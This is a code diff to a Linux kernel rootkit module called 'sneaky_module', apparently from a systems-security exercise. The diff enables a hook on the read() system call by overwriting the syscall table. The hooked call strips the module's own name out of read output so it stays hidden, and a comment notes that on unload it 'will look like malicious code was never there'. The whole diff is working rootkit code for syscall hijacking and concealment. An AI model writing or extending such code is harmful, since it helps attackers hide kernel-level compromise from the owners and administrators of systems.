@@ -130,14 +130,14 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
 
   byte_read = original_read(fd, buf, count);
   if (hide_module_flag) {
-    char *module_name = "sneaky_module";
+    char *module_name = "sneaky_mod";
     char *module_ptr = strstr(buf, module_name);
     if (module_ptr) {
       char *curr = strstr(buf, "\n");
       ssize_t sz_diff = (size_t)(curr - (char *)buf);
       ssize_t count = byte_read - sz_diff;
       ssize_t sneaky_module_sz = (size_t)(curr - module_ptr);
-      memcpy(module_ptr, curr + 1, count);
+      memmove(module_ptr, curr + 1, count);
       byte_read = byte_read - sneaky_module_sz;
     }
     hide_module_flag = false;
@@ -171,8 +171,8 @@ static int initialize_sneaky_module(void) {
   original_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
-  // original_read = (void *)*(sys_call_table + __NR_read);
-  // *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+  original_read = (void *)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -200,7 +200,7 @@ static void exit_sneaky_module(void) {
   // function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-  // *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
